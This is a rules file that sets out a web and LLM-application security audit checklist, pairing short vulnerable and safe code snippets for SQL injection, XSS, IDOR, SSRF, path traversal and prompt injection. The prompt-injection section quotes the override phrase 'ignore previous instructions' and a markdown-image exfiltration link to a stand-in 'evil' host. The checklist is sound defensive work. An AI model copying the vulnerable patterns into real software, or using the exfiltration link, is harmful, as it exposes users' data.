---
alwaysApply: false
description: "Security audit checklist: injection, XSS, auth, access control, SSRF, crypto"
---

# Security Audit Rules

## Injection

- [ ] No string concatenation in SQL — parameterized queries only
- [ ] No raw user input in shell commands — allowlists or subprocess arrays
- [ ] No `eval()`, `exec()`, `Function()`, `vm.runInNewContext()` with user input
- [ ] No string interpolation in ORM `.where()`/`.raw()`/`.query()`
- [ ] No user input in templates without sandbox (SSTI)
- [ ] No unescaped user input in HTTP headers (CRLF)
- [ ] No user input in LDAP/XPath/XML queries without sanitization

```typescript
// VULNERABLE
const result = await db.query(
  `SELECT * FROM users WHERE id = ${req.params.id}`,
);
// SAFE
const result = await db.query("SELECT * FROM users WHERE id = $1", [
  req.params.id,
]);
```

## Prompt Injection (LLM)

### Direct Injection & System Prompt Hardening

- [ ] Use role-based API messages (system/user/tool) — never concatenate user input into the system prompt
- [ ] System prompt defines role, scope, refusal policy; treat user/tool content as DATA, not COMMANDS
- [ ] No secrets, API keys, PII, or internal URLs in the system prompt — assume it leaks
- [ ] Cap user input length; reject/truncate oversized prompts before sending
- [ ] Do not echo raw user input into another privileged prompt without sanitization

```typescript
// VULNERABLE
const prompt = `You are an admin assistant. User says: ${userInput}`;
await openai.responses.create({ model, input: prompt });
// SAFE
await openai.responses.create({
  model,
  input: [
    { role: "system", content: SYSTEM_PROMPT },
    { role: "user", content: userInput },
  ],
});
```

### Indirect Injection (RAG, Tools, External Content)

- [ ] Treat ALL retrieved/tool/scraped/file content as untrusted — may contain injected instructions
- [ ] Wrap external content in labeled delimiters (`<untrusted_document>…</untrusted_document>`) — data only
- [ ] Strip instruction-shaped patterns in retrieved text ("ignore previous instructions", hidden HTML/markdown comments, zero-width chars, base64 blobs)
- [ ] Never pass tool output directly into a privileged planner without sanitization/classification
- [ ] Prefer dual-LLM/quarantined-LLM: untrusted content processed by a model with NO tool access; only structured results cross the boundary

```typescript
// VULNERABLE — document can redirect the agent
const docs = await vectorStore.search(query);
await agent.run(`Answer using:\n${docs.map((d) => d.text).join("\n")}`);
// SAFE — labeled, sanitized, and summarized by a tool-less model first
const clean = docs.map((d) => sanitize(d.text));
const summary = await quarantinedLLM.summarize(clean);
await agent.run([
  { role: "system", content: SYSTEM_PROMPT },
  { role: "user", content: query },
  {
    role: "tool",
    content: `<untrusted_summary>${summary}</untrusted_summary>`,
  },
]);
```

### Agent & Tool-Use

- [ ] Least privilege: LLM tokens scoped to minimum resources/actions
- [ ] Allowlist tool names; validate every tool-call argument against a schema (Zod/Pydantic) before executing
- [ ] Destructive, irreversible, or outbound-network actions require human-in-the-loop approval — never model-auto-approved
- [ ] Tool side-effects (DB writes, shell, HTTP, file ops) run in deterministic code, not eval'd from model output
- [ ] Rate-limit tool invocations per conversation; break loops on repeated injected calls

```typescript
// VULNERABLE
const { tool, args } = JSON.parse(modelOutput);
await tools[tool](...args);
// SAFE
const call = ToolCallSchema.parse(JSON.parse(modelOutput));
if (!ALLOWED_TOOLS.has(call.name)) throw new Error("tool not allowed");
if (DESTRUCTIVE.has(call.name) && !(await confirmWithHuman(call))) return;
await tools[call.name](call.args);
```

### Output Handling & Exfiltration

- [ ] Never render LLM output as HTML/markdown without sanitization — strip scripts, event handlers, `javascript:` URLs (see XSS)
- [ ] Block/rewrite markdown images and autolinks — attacker-controlled `![x](https://evil/?data=…)` exfiltrates context
- [ ] Validate structured output against a schema (JSON Schema/Zod/Pydantic) before acting; reject on parse failure
- [ ] Scan output for secrets, system-prompt fragments, canary tokens before returning to user
- [ ] Log prompts, tool calls, outputs with redaction; monitor for prompt-injection signatures in production

```typescript
// VULNERABLE — image URL exfiltrates prior context
<ReactMarkdown>{llmAnswer}</ReactMarkdown>
// SAFE — allowlist schemes, block images, strip HTML
<ReactMarkdown
  disallowedElements={["img", "script", "iframe"]}
  urlTransform={(url) => (ALLOWED_URL_SCHEMES.test(url) ? url : "")}
>{DOMPurify.sanitize(llmAnswer)}</ReactMarkdown>
```

## XSS

- [ ] No `dangerouslySetInnerHTML`/`innerHTML`/`document.write()` with unsanitized input
- [ ] No `javascript:` URLs from user input in `href`/`src`
- [ ] No user input in `<script>` tags or inline event handlers
- [ ] No unescaped user input in SSR HTML responses
- [ ] No `v-html`/`[innerHTML]`/`{@html}` with untrusted data

```typescript
// VULNERABLE
<div dangerouslySetInnerHTML={{ __html: userComment }} />
// SAFE
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userComment) }} />
```

## CSRF

- [ ] State-changing endpoints require CSRF tokens (POST/PUT/DELETE)
- [ ] No cookies-only auth on mutation endpoints
- [ ] `SameSite` cookie attribute: `Strict` or `Lax`
- [ ] WebSocket connections validate `Origin` header

## Authentication & Session

- [ ] No hardcoded credentials/keys/tokens in source
- [ ] No plaintext passwords — use bcrypt/scrypt/argon2
- [ ] No weak hashing (MD5, SHA1) for passwords
- [ ] Cryptographic random session tokens, invalidated on logout
- [ ] Session timeout, no credentials in URLs or logs
- [ ] Rate limiting on login endpoints

## Access Control

- [ ] Every endpoint checks authorization (not just authentication)
- [ ] No direct object references without ownership validation (IDOR)
- [ ] No client-side-only access control
- [ ] No role checks using only client-supplied values
- [ ] Mass assignment protection — allowlist fields

```typescript
// VULNERABLE: IDOR
app.get("/api/orders/:id", async (req, res) => {
  res.json(await Order.findById(req.params.id));
});
// SAFE
app.get("/api/orders/:id", async (req, res) => {
  const order = await Order.findById(req.params.id);
  if (order.userId !== req.user.id)
    return res.status(403).json({ error: "Forbidden" });
  res.json(order);
});
```

## SSRF

- [ ] No user-controlled URLs to server-side HTTP clients without validation
- [ ] Allowlist outbound hosts — block `localhost`, `127.0.0.1`, `169.254.x.x`, internal ranges
- [ ] Resolve and validate IP before fetching (DNS rebinding)

```typescript
// VULNERABLE
const response = await fetch(req.body.url);
// SAFE
const url = new URL(req.body.url);
if (!ALLOWED_HOSTS.includes(url.hostname)) throw new Error("Blocked host");
```

## Path Traversal

- [ ] No user input in `fs.readFile()`/`open()`/`include()` without sanitization
- [ ] Normalize and validate paths against base directory
- [ ] File downloads validate against allowed directories

```typescript
// VULNERABLE
res.sendFile(path.join("/uploads", req.params.filename));
// SAFE
const base = path.resolve("/uploads");
const file = path.resolve("/uploads", req.params.filename);
if (!file.startsWith(base)) return res.status(400).send("Invalid path");
res.sendFile(file);
```

## Configuration & Deployment

- [ ] No debug mode in production, no default credentials
- [ ] No `.env`/`.git/`/`docker-compose.yml` exposed to web
- [ ] Security headers: CSP, X-Content-Type-Options, X-Frame-Options, HSTS
- [ ] No stack traces/internal errors exposed to clients
- [ ] No `pickle.loads()`, `yaml.load()` (without SafeLoader), `unserialize()` on untrusted data
- [ ] No `JSON.parse()` piped into `eval()`/`Function()`

## Cryptographic Weaknesses

- [ ] No `Math.random()`/`random.random()` for tokens — use `crypto.randomBytes()`/`secrets.token_hex()`
- [ ] No MD5/SHA1 for integrity or passwords
- [ ] No hardcoded keys/IVs/salts, no ECB mode, no custom crypto

## File Upload

- [ ] Server-side file type validation (not just extension/MIME)
- [ ] Upload dir outside web root or execution blocked
- [ ] Server-side size limits, sanitized filenames
- [ ] No executable extensions (`.php`, `.jsp`, `.sh`, `.exe`, `.py`)

## API Security

- [ ] Return only required fields — no full DB records
- [ ] Pagination enforced, rate limiting on public endpoints
- [ ] GraphQL: depth limiting and complexity analysis

## Other

- [ ] No open redirects — allowlist redirect URLs
- [ ] No user input in `Host` header or email headers
- [ ] Critical sections use locks/atomic operations (race conditions)
- [ ] No `target="_blank"` without `rel="noopener noreferrer"`
- [ ] No sensitive data in localStorage/sessionStorage unencrypted
- [ ] Enforce HTTPS for sensitive data
